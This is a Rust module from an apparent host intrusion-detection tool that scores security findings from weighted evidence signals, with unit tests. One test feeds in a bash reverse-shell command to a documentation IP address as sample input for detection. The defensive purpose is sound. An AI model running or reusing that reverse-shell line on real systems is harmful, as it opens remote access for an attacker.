use crate::detectors::command_profile::assess_network_execution_command;
use sentinel_core::{evidence_value, Evidence, Finding};
use std::collections::BTreeSet;

const SCORE_KEY: &str = "evidence_score";
const STRENGTHS_KEY: &str = "evidence_strengths";
const DOWNGRADES_KEY: &str = "evidence_downgrades";

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EvidenceAssessment {
    pub score: u16,
    pub strengths: Vec<String>,
    pub downgrades: Vec<String>,
}

pub fn enrich_findings(findings: &mut [Finding]) {
    for finding in findings {
        let assessment = assess_finding(finding);
        upsert_evidence(
            &mut finding.evidence,
            SCORE_KEY,
            assessment.score.to_string(),
        );
        upsert_evidence(
            &mut finding.evidence,
            STRENGTHS_KEY,
            assessment.strengths.join(", "),
        );
        if !assessment.downgrades.is_empty() {
            upsert_evidence(
                &mut finding.evidence,
                DOWNGRADES_KEY,
                assessment.downgrades.join(", "),
            );
        }
    }
}

pub fn assess_finding(finding: &Finding) -> EvidenceAssessment {
    let mut score = 20u16;
    let mut strengths = BTreeSet::new();
    let mut downgrades = BTreeSet::new();

    for item in &finding.evidence {
        if let Some(signal) = evidence_signal(&item.key, &item.value) {
            score = score.saturating_add(signal.weight).min(100);
            strengths.insert(signal.name.to_string());
        }
    }

    for downgrade in downgrade_signals(finding) {
        score = score.saturating_sub(downgrade.weight);
        downgrades.insert(downgrade.name.to_string());
    }

    EvidenceAssessment {
        score,
        strengths: strengths.into_iter().collect(),
        downgrades: downgrades.into_iter().collect(),
    }
}

pub fn evidence_score(finding: &Finding) -> Option<u16> {
    evidence_value(&finding.evidence, SCORE_KEY)?
        .parse::<u16>()
        .ok()
        .map(|value| value.min(100))
}

struct Signal {
    name: &'static str,
    weight: u16,
}

fn evidence_signal(key: &str, value: &str) -> Option<Signal> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    match key {
        "source_ip" | "active_response_ip" => Some(Signal {
            name: "source_ip",
            weight: 8,
        }),
        "failure_count" => volume_signal("failure_count", value),
        "request_count" => volume_signal("request_count", value),
        "error_count" => volume_signal("error_count", value),
        "risk_score" | "behavior_score" | "unified_risk_score" => numeric_score_signal(value),
        "threat_intel_match" if value == "true" => Some(Signal {
            name: "threat_intel",
            weight: 20,
        }),
        "attack_fingerprint_id" => Some(Signal {
            name: "attack_fingerprint",
            weight: 14,
        }),
        "attack_fingerprint_action_hint" if value == "block" => Some(Signal {
            name: "fingerprint_response_hint",
            weight: 16,
        }),
        "active_response_status" => Some(Signal {
            name: "active_response",
            weight: 14,
        }),
        "exe_hash_blake3" | "package_owner" | "systemd_unit" | "parent_name" => Some(Signal {
            name: "process_identity",
            weight: 8,
        }),
        "outbound_remote_ports" | "public_outbound_connections" | "socket_fd_count" => {
            Some(Signal {
                name: "network_behavior",
                weight: 10,
            })
        }
        "gpu_process" if value == "true" => Some(Signal {
            name: "gpu_context",
            weight: 8,
        }),
        "log_size_drop" | "log_file_missing" if value == "true" => Some(Signal {
            name: "anti_forensics",
            weight: 18,
        }),
        "symlink_target" if risky_log_target(value) => Some(Signal {
            name: "risky_log_target",
            weight: 22,
        }),
        "cmdline" | "argv" if command_has_execution_intent(value) => Some(Signal {
            name: "command_execution_intent",
            weight: 12,
        }),
        _ => None,
    }
}

fn volume_signal(key: &'static str, value: &str) -> Option<Signal> {
    let count = value.parse::<u64>().ok()?;
    let weight = if count >= 50 {
        18
    } else if count >= 10 {
        12
    } else if count >= 3 {
        6
    } else {
        3
    };
    Some(Signal { name: key, weight })
}

fn numeric_score_signal(value: &str) -> Option<Signal> {
    let score = value.parse::<u16>().ok()?.min(100);
    let weight = if score >= 90 {
        24
    } else if score >= 75 {
        18
    } else if score >= 55 {
        10
    } else {
        4
    };
    Some(Signal {
        name: "detector_score",
        weight,
    })
}

fn downgrade_signals(finding: &Finding) -> Vec<Signal> {
    let mut signals = Vec::new();
    if evidence_value(&finding.evidence, "package_activity_recent") == Some("true") {
        signals.push(Signal {
            name: "package_activity_context",
            weight: 12,
        });
    }
    if evidence_value(&finding.evidence, "proxy_source_unresolved") == Some("true") {
        signals.push(Signal {
            name: "unresolved_trusted_proxy",
            weight: 20,
        });
    }
    if evidence_value(&finding.evidence, "recent_rotated_sibling") == Some("true") {
        signals.push(Signal {
            name: "log_rotation_context",
            weight: 18,
        });
    }
    signals
}

fn risky_log_target(value: &str) -> bool {
    let normalized = value.replace('\\', "/");
    normalized == "/dev/null"
        || normalized.starts_with("/tmp/")
        || normalized.starts_with("/var/tmp/")
        || normalized.starts_with("/dev/shm/")
}

fn command_has_execution_intent(value: &str) -> bool {
    assess_network_execution_command(value).is_suspicious()
}

fn upsert_evidence(evidence: &mut Vec<Evidence>, key: &str, value: impl Into<String>) {
    let value = value.into();
    if let Some(existing) = evidence.iter_mut().find(|item| item.key == key) {
        existing.value = value;
        return;
    }
    evidence.push(Evidence::new(key, value));
}

#[cfg(test)]
mod tests {
    use super::{assess_finding, enrich_findings, evidence_score};
    use sentinel_core::{Category, Evidence, Finding, Severity};

    #[test]
    fn scores_strong_process_evidence_without_global_state() {
        let finding = Finding::new(
            "host",
            "test",
            "test",
            Severity::Medium,
            Category::Process,
            "PROC-005",
            "pid",
        )
        .with_evidence(vec![
            Evidence::new("behavior_score", "82"),
            Evidence::new(
                "cmdline",
                "bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1",
            ),
            Evidence::new("outbound_remote_ports", "3333"),
        ]);

        let assessment = assess_finding(&finding);

        assert!(assessment.score >= 60);
        assert!(assessment
            .strengths
            .contains(&"command_execution_intent".to_string()));
    }

    #[test]
    fn downgrade_package_activity_context() {
        let finding = Finding::new(
            "host",
            "test",
            "test",
            Severity::Medium,
            Category::FileIntegrity,
            "FILE-001",
            "/etc/passwd",
        )
        .with_evidence(vec![
            Evidence::new("risk_score", "70"),
            Evidence::new("package_activity_recent", "true"),
        ]);

        let assessment = assess_finding(&finding);

        assert!(assessment
            .downgrades
            .contains(&"package_activity_context".to_string()));
        assert!(assessment.score < 60);
    }

    #[test]
    fn enrichment_adds_standard_score_fields() {
        let mut findings = vec![Finding::new(
            "host",
            "test",
            "test",
            Severity::High,
            Category::Web,
            "WEB-001",
            "8.8.8.8",
        )
        .with_evidence(vec![
            Evidence::new("source_ip", "8.8.8.8"),
            Evidence::new("request_count", "20"),
        ])];

        enrich_findings(&mut findings);

        assert!(evidence_score(&findings[0]).is_some());
    }
}
